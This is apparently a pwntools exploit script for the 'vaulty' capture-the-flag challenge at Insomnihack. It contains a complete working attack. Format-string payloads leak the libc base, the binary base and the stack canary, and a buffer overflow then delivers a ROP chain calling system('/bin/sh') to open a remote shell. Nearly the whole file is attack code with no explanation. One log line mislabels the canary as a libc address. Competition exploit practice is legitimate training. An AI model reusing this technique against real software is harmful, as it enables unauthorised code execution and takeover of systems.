#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=vaulty.insomnihack.ch' '--port=4556' vaulty
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vaulty')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'vaulty.insomnihack.ch'
port = int(args.PORT or 4556)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
io.sendlineafter(b"(1-5):", b"1")
io.sendlineafter(b"name:", b"%161$p")
io.sendline(b"%13$p")
io.sendline(b"%11$p")
io.sendline(b"4")
io.sendline(b"0")
io.recvuntil(b"Username:")
libc= int(io.recvline().strip(),16)-171584
log.success(f" libc leaked @ {hex(libc)}")
io.recvuntil(b"Password:")
elfaddr= int(io.recvline().strip(),16)-6532
log.success(f" elfaddr leaked @ {hex(elfaddr)}")
io.recvuntil(b"Url:")
canary= int(io.recvline().strip(),16)
log.success(f" libc leaked @ {hex(canary)}")

pop_rdi = 0x000000000002a3e5 + libc
system = 0x000000000050d70 + libc
bin_sh = 0x1d8678 + libc
ret = 0x0000000000029139 + libc

io.sendlineafter(b"(1-5):", b"1")
io.sendline(b"aaa")
io.sendline(b"aaa")
io.sendline(b"A"*40+p64(canary)+b"A"*24+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))

io.interactive()

